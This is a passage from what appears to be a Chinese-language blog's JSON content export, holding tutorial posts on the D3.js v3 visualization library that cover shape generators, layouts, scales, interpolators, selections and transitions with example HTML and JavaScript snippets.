&lt;style&gt; .container text &#123; font-size: 30px; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 500; let h = 400; let padding = &#123; top: 20, right: 20, bottom: 30, left: 40 &#125;; let dataSet = &#x27;abcdefghijklmn&#x27;.split(&#x27;&#x27;); let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding.left&#125;, $&#123;padding.top&#125;)`) .attr(&#x27;width&#x27;, w - padding.left - padding.right) .attr(&#x27;height&#x27;, h - padding.top - padding.bottom); function update(dataSet) &#123; let texts = container.selectAll(&#x27;text&#x27;).data(dataSet/* , (d) =&gt; d */); console.log(dataSet); // update 部分 texts.attr(&#x27;x&#x27;, (data, i) =&gt; i * 30) .attr(&#x27;y&#x27;, 120) .style(&#x27;fill&#x27;, &#x27;#f00&#x27;) .text((data) =&gt; &#123; console.log(&#x27;update ----&gt; &#x27; + data); return data; &#125;); // enter 部分 texts.enter() .append(&#x27;text&#x27;) .attr(&#x27;x&#x27;, (data, i) =&gt; i * 30) .attr(&#x27;y&#x27;, 120) .style(&#x27;fill&#x27;, &#x27;#0f0&#x27;) .text((data) =&gt; &#123; console.log(&#x27;enter ----&gt; &#x27; + data); return data; &#125;); // exit 部分 texts.exit() .transition() .duration(200) .style(&#x27;opacity&#x27;, (data) =&gt; &#123; console.log(&#x27;exit ----&gt; &#x27; + data); return 0; &#125;) .style(&#x27;transform&#x27;, &#x27;scale(0)&#x27;) .remove(); &#125; window.setInterval(() =&gt; &#123; let data = [&#x27;A&#x27;, &#x27;B&#x27;, ...d3.shuffle(dataSet).slice(0, Math.ceil(Math.random() * 10))]; update(data); &#125;, 1000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"形状","slug":"D3.js/形状","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:17.703Z","comments":true,"path":"2021/03/24/D3.js/形状/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%BD%A2%E7%8A%B6/","excerpt":"","text":"形状线条生成器 d3.svg.line line.x() line.y() line.interpolate() linear：分段的线性片段，如折线。 step：水平和垂直片段之间交替，如台阶函数。 step-before：垂直和水平片段之间交替，如台阶函数。 step-after： 水平和垂直片段之间交替，如台阶函数。 basis：一个B-spline，在末尾控制点的重复。 basis-open：一个开放的B-spline；首尾不相交。 cardinal：一个Cardinal spline，在末尾控制点的重复。 cardinal-open：一个开放的Cardinal spline；首尾不相交，但是会和其他控制点相交。 monotone：立方插值(cubic interpolation)保存y值得单调性。 line.tension() 区域生成器 d3.svg.area area.x() area.y0() area.y1() area.interpolate() area.tensioin() 圆弧生成器 d3.svg.arc arc() 生成一个像饼图或圆环图中的固定弧度 arc.centroid(args) 计算弧中心，返回值为一个数组 arc.innerRadius() 获取或设置内半径访问器 arc.outerRadius() 获取或设置外半径访问器 arc.cornerRadius() 获取或设置拐角（corner）半径访问器 arc.startAngle() 获取或设置开始角度访问器 arc.endAngle() 获取或设置结束角度访问器 arc.padAngle() 获取或设置填补（pad）角度访问器 arc.padRadius() 获取或设置填补（pad）半径访问器 1234567891011121314151617181920212223242526272829303132333435363738394041424344let w = 600;let h = 400;let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h);let endAngle = 2 * Math.PI;let data = [&#123; startAngle: 0, endAngle: 0.1 * endAngle &#125;, &#123; startAngle: 0.1 * endAngle, endAngle: 0.2 * endAngle &#125;, &#123; startAngle: 0.2 * endAngle, endAngle: 0.4 * endAngle &#125;, &#123; startAngle: 0.4 * endAngle, endAngle: 0.6 * endAngle &#125;, &#123; startAngle: 0.6 * endAngle, endAngle: 0.7 * endAngle &#125;, &#123; startAngle: 0.7 * endAngle, endAngle: 0.9 * endAngle &#125;, &#123; startAngle: 0.9 * endAngle, endAngle: endAngle &#125;];let arc = d3.svg.arc() .innerRadius(100) .outerRadius(150);let color = d3.scale.category10();svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;arc&#x27;) .attr(&#x27;transform&#x27;, &#x27;translate(250, 250)&#x27;).selectAll(&#x27;path&#x27;) .data(data) .enter() .append(&#x27;path&#x27;) .style(&#x27;fill&#x27;, (d, i) =&gt; color(i)) .transition() .duration(1200) .attrTween(&#x27;d&#x27;, (d) =&gt; &#123; let start = &#123; startAngle: 0, endAngle: 0 &#125;; let interpolate = d3.interpolate(start, d); return (t) =&gt; arc(interpolate(t)); &#125;);","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"布局","slug":"D3.js/布局","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:30:46.361Z","comments":true,"path":"2021/03/24/D3.js/布局/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E5%B8%83%E5%B1%80/","excerpt":"","text":"布局1、饼布局 d3.layout.pie pie.endAngl 取得或设置饼布局整体的结束角度 pie.padAngle 取得或设置饼布局填充角度 pie.sort 控制饼片段的顺时针方向的顺序 pie.startAngle 取得或设置饼布局整体的开始角度 pie.value 取得或设置值访问器函数 pie 计算饼图或圆环图中弧的开始和结束角度 力布局 d3.layout.force force.links() 取得或者设置节点间的链接数组 force.nodes() 取得或者设置布局的节点数组 force.size() 取得或者设置布局大小 force.linkDistance() 取得或者设置链接距离 force.charge() 取得或者设置电荷强度 force.on() 监听在计算布局位置时的更新 start 力学图运动开始 tick 力学图运动中 end 力学图运动结束 force.drag() 给节点绑定拖动行为 dragstart 单个节点拖拽开始 drag 单个节点拖拽中 dragend 单个节点拖拽结束 force.alpha() 取得或者设置力布局的冷却参数 树布局 d3.layout.tree tree() tree.nodes的别名 tree.children() 取得或设置孩子访问器 tree.size() 用x和y指定树的尺寸 tree.nodes() 计算父布局并返回一组节点 tree.links() 计算树节点的父-子连接 tree.sort() 控制遍历顺序中兄弟节点的顺序 tree.nodeSize() 为每个节点指定一个固定的尺寸 tree.separation() 取得或设置相邻节点的间隔函数","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"技巧","slug":"D3.js/技巧篇","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:12.302Z","comments":true,"path":"2021/03/24/D3.js/技巧篇/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E6%8A%80%E5%B7%A7%E7%AF%87/","excerpt":"","text":"技巧 画布区域要有留白 padding = [20, 20, 30, 40] Y 轴方向的尺度需要做倒置处理，因为浏览器默认 SVG 的 Y 轴是从上至下，但按照图标惯例是从下至上，所以数据项的值越大时，对应的 Y 轴坐标应该越小。为了处理这些逆转，可以在定义范围时交换这些值，如 d3.scale.linear().domain([0, maxVal]).range([height, 0]) &lt;g&gt; 元素内的所有元素都是以父元素 &lt;g&gt; 为标准进行排版 图形区域用 &lt;g&gt; 元素包裹 坐标轴区域用 &lt;g&gt; 元素包裹 图例区域用 &lt;g&gt; 元素包裹 … 对于图标中可能会重叠的项，可以添加透明度，增强层次感","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"比例尺","slug":"D3.js/比例尺","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:29:34.781Z","comments":true,"path":"2021/03/24/D3.js/比例尺/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E6%AF%94%E4%BE%8B%E5%B0%BA/","excerpt":"","text":"比例尺说明：任何数据集中的值都不太可能完全对应于可视化中使用的像素测量值。比例提供了一种方便的方法，将这些数据值映射为可用于可视化目的的新值。 d3.scale 数据集中的数据其实是通过映射成一个个坐标点后在页面中绘制出来的，而数据可能会很大或很小，所以需要将数值进行映射以适配 SVG 容器的大小 scale.copy: 创建比例尺的副本。 scale.interpolate: 取得或设置比例尺的输出插值器。 scale.invert: 取得给定输出值对应定义域中的值。 scale.nice: 扩展比例尺的定义域为一个优化的整数值。 scale.tickFormat: 取得用于展示刻度值的格式化器。 scale.ticks: 取得定义域中有代表性的值。 插值器给定函数 f(x) 在 x0, x1,...,xn 处的值。现有 x&#39;，其值在上述取值点间。那么，求 f(x&#39;)值的过程叫做 插值 插值不仅在尺度功能的实现中非常重要，对于 D3 的其他核心功能的实现也不可或缺，例如，动画和布局管理功能。因而 D3 设计了一个独立、可重用的插值器，以便在实现其他功能时提供统一的调用方式。（默认的范围域是 [0, 1]） d3.interpolate: 返回一个介于 a 和 b 之间的默认插值器(a、b可为对象，包含多个属性，使用复合尺度插值时，D3 会遍历对象中的所有成员，并对其每一个组成部分应用相应的简单插值规则) d3.interpolateNumber: 插补两个数字值 d3.interpolateString: 插补两个字符串 d3.interpolateArray: 插补两个数组 d3.interpolateHcl: 插补两个 HCL 颜色值 d3.interpolateHsl: 插补两个 HSL 颜色值 d3.interpolateLab: 插补两个 L * a * b * 颜色值 d3.interpolateObject: 插补两个任意对象 d3.interpolateRgb: 插补两个RGB颜色值 d3.interpolateRound: 插补两个整数 d3.interpolateTransform: 插补两个 2D 矩阵变换 d3.interpolateZoom: 在两个点之间平滑地缩放平移 123456789var interpolate = d3.interpolateNumber(0, 100);interpolate(0.1); // 10interpolate(0.99); // 99// 使用 d3.interpolateNumber 函数创建了一个值域为 [0, 100] 的interpolate函数，并使用这个函数对指定的数字进行插值。该函数与如下代码是等价的。// function interpolate(t)&#123;// return a * (1 - t) + b * t;// &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 600; let h = 400; let start = &#123; &#x27;font-size&#x27;: &#x27;12px&#x27;, color: &#x27;#f00&#x27; &#125;; let end = &#123; &#x27;font-size&#x27;: &#x27;40px&#x27;, color: &#x27;#ff0&#x27; &#125;; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let interpolate = d3.interpolate(start, end); let groups = svg.append(&#x27;g&#x27;); for (let i = 1; i &lt; 10; i++) &#123; let info = interpolate(i / 10); groups.append(&#x27;text&#x27;) .text(i) .attr(&#x27;x&#x27;, 0 + i * 24) .attr(&#x27;y&#x27;, 40), .attr(&#x27;class&#x27;, &#x27;text-list&#x27;) .style(&#x27;fill&#x27;, info.color) .style(&#x27;font-size&#x27;, info[&#x27;font-size&#x27;]); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 类别 数值尺度 d3.scale.linear: 线性比例尺 （f(n) = kx + b） d3.time.scale: 线性时间比例尺 d3.scale.pow: 指数比例尺 （f(n) = a * n ^ 2 + b） pow.exponent(k) 用于设置二项式系数 a 的值，默认为 1 d3.scale.log: 对数比例尺（f(n) = a * log(n) + b） log.base(base) : 设置这个对数比例尺的底数，默认是 10 d3.scale.quantize: 量化比例尺（定义域是连续的，值域是离散） d3.scale.identity: 线性恒等比例尺 d3.scale.quantile: 分位数比例尺 d3.scale.sqrt: 平方根比例尺 d3.scale.threshold: 临界值比例尺（值域离散） 有序尺度 d3.scale.ordinal: 序数比例尺 （key、value 映射，无具体表达式） d3.scale.category10: 该比例尺中有默认的值域中有 10 种颜色 d3.scale.category20: 该比例尺中有默认的值域中有 20 种颜色 d3.scale.category20b: 该比例尺中有默认的值域中有 20 种颜色 d3.scale.category20c: 该比例尺中有默认的值域中有 20 种颜色 线性比例尺说明：将输入域映射到连续的输出范围，类似 y=kx+b 线性函数，如将身高映射成柱状图的高度（像素），let linear = d3.scale.linear() 线性比例尺的默认输入域 [0, 1]，默认输出范围为 [0, 1]，此时为恒等函数 比例尺只是定义了一个映射规则，映射的输入值并不局限于 domain() 中的输入域 linear(x)：在输入域中的输入 x，返回输出范围对应的值。 linear.domain([min, max])：指定输入域范围 linear.range([min, max])：指定输出范围 linear.ticks()：返回比例尺输入域的代表性时间 时间比例尺说明：d3.time.scale 是 d3.scale.linear 比例尺的扩展，使用 Javascript 的 Date 对象作为其输入域 domain，let time = d3.time.scale() time: 取得给定定义域中值对应的输出范围中的值。 time.domain: 取得或设置比例尺度的定义域。 time.rangeRound: 设置比例尺的四舍五入输出范围。 time.range：取得或设置比例尺的输出范围。 序号比例尺说明：序号比例尺来映射输入域（离散）到输出范围。 let ordinal = d3.scale.ordinal() ordinal(x)：在输入域中的输入 x，返回输出范围对应的值。 ordinal.domain([a, b, ..., x])：指定输入域范围（一系列离散的数据） ordinal.range([k1, k2, ..., kn])：如果指定了输出范围，设置当前比例尺对象的输出范围为指定的 values 数组，如果 values 中的值的个数少于输入域中元素的个数，那么 values 中的值会被循环使用。（主要用于颜色） ordinal.rangePoints([min, max], padding)：指定输出范围为一个连续的区间，第一个位置和最后一个位置会因为入参 padding 的值而做相应，消减长度是padding 个间隔长度的一半；默认情况下 padding 是 0 ordinal.rangeBands([min, max], padding, outerPadding)：该函数是将区间切分成一个个小的区间段，而不是一个个刻度点（刻度在坐标轴中间，而不是在起点，适用于柱状图） rdinal.rangeRoundPoints([min, max], padding)：功能同 ordinal.rangePoints，但是该函数可以美化输出的刻度点，即保证整数 ordinal.rangeRoundBands([min, max], padding, outerPadding) 功能同 ordinal.rangeBands，但是该函数可以美化输出的区间段，即保证每个区间段的起点值都是整数 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 800; let h = 400; let padding = 40; let dateRange = [new Date(2017, 0, 1), new Date(2018, 2, 1)]; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let xScale = d3.time.scale() .domain(dateRange) .rangeRound([padding, w - padding]); let axis = d3.svg.axis() .scale(xScale) .tickFormat(d3.time.format(&#x27;%m-%d&#x27;)); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;x-axis&#x27;) .call(axis); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"选择集","slug":"D3.js/选择集","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:21.315Z","comments":true,"path":"2021/03/24/D3.js/选择集/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E9%80%89%E6%8B%A9%E9%9B%86/","excerpt":"","text":"选择集选择器d3.select() 与 jQuery 的选择器类似，支持各种 CSS3 选择器，并能通过各种条件筛选（实际上使用的是浏览器提供的查询方法 document.querySelector()） 元素选择说明：d3.select()、d3.selectAll() 返回值是一组选择，该选择是一组元素。D3 绑定额外的方法到该数组上（在该对象与数组间添加了一层原型链 d3.selection.prototype），可以在选中的元素上应用操作，例如为所有选中的元素设置属性值。 d3.select() 、d3.selectAll() 返回一个选集 selection，它是 D3 操作 DOM 的入口selection.data() 操作的结果是 update 选择，这表示选择的 DOM 元素已成功绑定到指定的数据元素。update 选择还包含对 enter 和 exit 的选择。 选择集（selection） selection.select(selector): 选中第一个目标元素 selection.selectAll(selector): 选中所有符合的目标元素 selection.append(name) selection.insert(name, before) selection.remove() selection.empty() selection.filter(filter) selection.attr(name, value)：获取、设置元素的属性 selection.style(name, value, priority)：获取、设置元素的 CSS 样式 selection.classed(name, value)：获取、设置元素的 class 属性，可以对象的方式一次传入多个属性， selection.property(name, value)：获取、设置元素的 prop 特性，如是否被选中、value 等信息 selection.html(value)：用来获取或设置选定元素的 HTML selection.text(value)：用来获取或设置选定元素的文本内容 selection.size() selection.node()(type, listener, capture) 说明 当没有任何元素符合条件时，方法返回的是一个空的选择结果（selection） 这些函数可用于单个元素以及多个元素，当应用于多元素选集时，这些函数会依次作用于其中每个元素 attr()、text() 等方法中中赋值时可使用函数，如 function (data, i) &#123; console.log(this); &#125; ，其中 data 指每一项数据，i 指索引，this 指当前 DOM 元素 selection 选择集的 select、append、insert函数会返回一个新的选集，建议用缩进来区别应用于不同选集上的级联函数，如下所示： 12345d3.select(&#x27;.rect-test&#x27;) .attr(&#x27;fill&#x27;, &#x27;red&#x27;).selectAll(&#x27;text&#x27;) .attr(&#x27;x&#x27;, 100) .attr(&#x27;y&#x27;, 100); selection.data(value, key) 连接指定的一组数据的和当前选择，key 函数可以被指定为控制数据是如何连接元素 没有 key 函数时，默认使用 index 连接元素，即用 index 判断 enter、update 和 exit 选择集 有 key 函数时，用 key 函数的返回值连接元素，有利于复用 DOM 元素（与 Vue 中的 v-key 相似） selection.datum(value) 获取或设置每个选定的元素绑定的数据，不计算一个连接（因此不计算 enter 和 exit 的选择） selection.each(callback) 遍历集合中的每个元素 selection.sort(comparator) 根据指定的 comparator 函数对当前选择的元素排序 selection.order() 重新插入元素到文档，使文档顺序选与择顺序就相匹配 selection.call(callback) 调用指定函数，并返回当前选择（方便链式调用） svg.append(&#39;g&#39;).call(axis) 与 axis(svg.append(&#39;g&#39;)) 作用一样; selection.interrupt(name) 立即中断当前的过渡 selection.transition(name) 为当前选择添加过渡效果 说明： 所有绑定了数据的父元素，其子元素均具有从父元素那里继承下来的值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;D3.js - 散点图&lt;/title&gt; &lt;style&gt; .axis path, .axis line &#123; fill: none; stroke: black; shape-rendering: crispEdges; &#125; .axis text &#123; font-family: sans-serif; font-size: 12px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 400; let h = 300; let padding = 30; let dataSet = [[5, 20], [480, 90], [250, 50], [100, 33], [330, 95], [410, 12], [475, 44], [25, 67], [85, 21], [220, 88]]; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let xScale = d3.scale.linear() .domain([0, d3.max(dataSet, data =&gt; data[0])]) .range([padding, w - padding * 2]); let yScale = d3.scale.linear() .domain([0, d3.max(dataSet, data =&gt; data[1])]) .range([h - padding, padding]); let rScale = d3.scale.linear() .domain([0, d3.max(dataSet, data =&gt; data[1])]) .range([4, 10]); let circles = svg.selectAll(&#x27;circle&#x27;) .data(dataSet) .enter() .append(&#x27;circle&#x27;); let xAxis = d3.svg.axis() .scale(xScale) .ticks(6) .orient(&#x27;bottom&#x27;); let yAxis = d3.svg.axis() .scale(yScale) .ticks(5) .orient(&#x27;left&#x27;); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis&#x27;) .attr(&#x27;transform&#x27;, `translate(0, $&#123;h - padding&#125;)`) .call(xAxis); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;axis&#x27;) .attr(&#x27;transform&#x27;, `translate($&#123;padding&#125;, 0)`) .call(yAxis); circles.attr(&#x27;cx&#x27;, data =&gt; xScale(data[0])) .attr(&#x27;cy&#x27;, data =&gt; yScale(data[1])) .attr(&#x27;r&#x27;, data =&gt; rScale(data[1])); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/categories/D3-js/"}],"tags":[{"name":"D3.js","slug":"D3-js","permalink":"https://xuxb.github.io/tags/D3-js/"}]},{"title":"过渡","slug":"D3.js/过渡","date":"2021-03-23T16:00:00.000Z","updated":"2021-04-28T02:31:04.335Z","comments":true,"path":"2021/03/24/D3.js/过渡/","link":"","permalink":"https://xuxb.github.io/2021/03/24/D3.js/%E8%BF%87%E6%B8%A1/","excerpt":"","text":"过渡d3.selection.trasition 返回一个具备过渡能力的选集 d3.selection.data(dataSet, fn) 的第二个参数 fn 数被称为对象标识函数。这个函数确保了返回对象的一致性，使数据和图形元素之间的绑定更稳定。为了保证一致性，每一个数据都应当具备一个唯一的标识，然后下次更新选集时，即便 value 发生了变化，相同 id 的数据仍然对应同一个元素。 D3 过渡并不要求每个被插值的数值都有明确的起始值和结束值。 如果缺失起始值，它将试图使用计算出的样式 如果缺失结束值，则将当前值作为常量 过渡效果 transition.duration(duration): duration 指定动画的持续时间，默认为 250ms，可传入具体数值或函数 transition.delay(delay): delay 指定动画的延迟时间，默认为 0， 可传入具体数值或函数 transition.ease(type): type 指定动画的缓动函数，默认缓动函数是 cubic-in-out，不可传入函数（通过使用 attrTween 或 styleTween 插值器中内置的定制缓动功能） 缓动模式: lnear、cubic、cubic-in-out、sin、sin-out、exp、circle、back、bounce 缓动模式修饰符: in、 out、 in-out、 out-in 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .rect-item &#123; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 600; let h = 400; let padding = 30; let dataSet = []; let id = 0; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); let container = svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;); function render(data) &#123; let rects = container.selectAll(&#x27;rect&#x27;) .data(data, (data) =&gt; data.id); let xScale = d3.scale.linear() .domain([0, data.length]) .range([0, w - padding * 2]); let yScale = d3.scale.linear() .domain([0, d3.max(data, (d) =&gt; d.value)]) .range([h - padding * 2, 0]); // update rects.attr(&#x27;class&#x27;, &#x27;rect-item&#x27;) .transition() .duration(500) .attr(&#x27;x&#x27;, (data, i) =&gt; xScale(i)) .attr(&#x27;y&#x27;, (data) =&gt; yScale(data.value)) .attr(&#x27;width&#x27;, 20) .attr(&#x27;height&#x27;, (data) =&gt; h - padding - yScale(data.value)); // enter rects.enter() .append(&#x27;rect&#x27;) .attr(&#x27;transform&#x27;, &#x27;translate(0, 100)&#x27;) .transition() .duration(500) .delay(200) .ease(&#x27;ease-in-out&#x27;) .attr(&#x27;class&#x27;, &#x27;rect-item&#x27;) .attr(&#x27;x&#x27;, (data, i) =&gt; xScale(i)) .attr(&#x27;y&#x27;, (data) =&gt; yScale(data.value)) .attr(&#x27;width&#x27;, 20) .attr(&#x27;transform&#x27;, &#x27;translate(0, 40)&#x27;) .attr(&#x27;height&#x27;, (data) =&gt; h - padding - yScale(data.value)); // exit rects.exit() .transition() .duration(500) .attr(&#x27;x&#x27;, -40) .style(&#x27;opacity&#x27;, 0) .remove(); &#125; function getRandomData() &#123; return Math.round(Math.random() * 20) + 5; &#125; for (let i = 0; i &lt; 15; i++) &#123; dataSet.push(&#123; id: ++id, value: getRandomData() &#125;); &#125; render(dataSet); window.setInterval(() =&gt; &#123; dataSet.shift(); dataSet.push(&#123; id: ++id, value: getRandomData() &#125;); render(dataSet); &#125;, 2000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 中间帧动画 attrTween(name, tween): 据指定的补间函数 tween，通过指定的名称过渡属性值 styleTween(name, tween): 据指定的补间函数 tween，通过指定的 CSS 样式的属性值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; rect &#123; fill: #090; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;http://d3js.org/d3.v3.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;script&gt; let w = 600; let h = 400; let svg = d3.select(&#x27;body&#x27;) .append(&#x27;svg&#x27;) .attr(&#x27;width&#x27;, w) .attr(&#x27;height&#x27;, h); function widthTween () &#123; let quantize = d3.scale.quantize() .domain([0, 1]) .range([40, 80, 120, 160, 200, 240, 280, 320, 360, 400]); return (t) =&gt; quantize(t); &#125; svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .append(&#x27;rect&#x27;) .attr(&#x27;x&#x27;, 0) .attr(&#x27;y&#x27;, 20) .attr(&#x27;height&#x27;, 20) .attr(&#x27;width&#x27;, 40) .transition() .duration(4000) .ease(&#x27;linear&#x27;) .attr(&#x27;width&#x27;, 400); svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;) .append(&#x27;rect&#x27;) .attr(&#x27;x&#x27;, 0) .attr(&#x27;y&#x27;, 60) .attr(&#x27;height&#x27;, 20) .attr(&#x27;width&#x27;, 40) .transition() .duration(4000) .ease(&#x27;linear&#x27;) .attrTween(&#x27;width&#x27;, widthTween); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 联级过渡1234567891011121314151617svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;).append(&#x27;rect&#x27;) .attr(&#x27;x&#x27;, 0) .attr(&#x27;y&#x27;, 20) .attr(&#x27;height&#x27;, 20) .attr(&#x27;width&#x27;, 40).transition() .duration(2000) .ease(&#x27;linear&#x27;) .attr(&#x27;width&#x27;, 400).transition() .duration(1000) .attr(&#x27;height&#x27;, 60).transition() .duration(1000) .style(&#x27;fill&#x27;, &#x27;#00f&#x27;); 选择性过渡123456789101112131415161718192021let data = [&#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;];svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;).selectAll(&#x27;rect&#x27;) .data(data) .enter().append(&#x27;text&#x27;) .attr(&#x27;class&#x27;, &#x27;text-item&#x27;) .attr(&#x27;x&#x27;, 10) .attr(&#x27;y&#x27;, (data, i) =&gt; (i + 1) * 40) .text(data =&gt; data).transition() .duration(1000) .ease(&#x27;bounce&#x27;) .attr(&#x27;x&#x27;, 500).filter((data) =&gt; data === &#x27;Cat&#x27;).transition() .duration(600) .ease(&#x27;linear&#x27;) .attr(&#x27;x&#x27;, 20); 监听过渡事件123456789101112131415161718192021222324252627282930let data = [&#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;, &#x27;Cat&#x27;, &#x27;Dog&#x27;];svg.append(&#x27;g&#x27;) .attr(&#x27;class&#x27;, &#x27;container&#x27;).selectAll(&#x27;rect&#x27;) .data(data) .enter().append(&#x27;text&#x27;) .attr(&#x27;class&#x27;, &#x27;text-item&#x27;) .attr(&#x27;x&#x27;, 10) .attr(&#x27;y&#x27;, (data, i) =&gt; (i + 1) * 40) .text(data =&gt; data).transition() 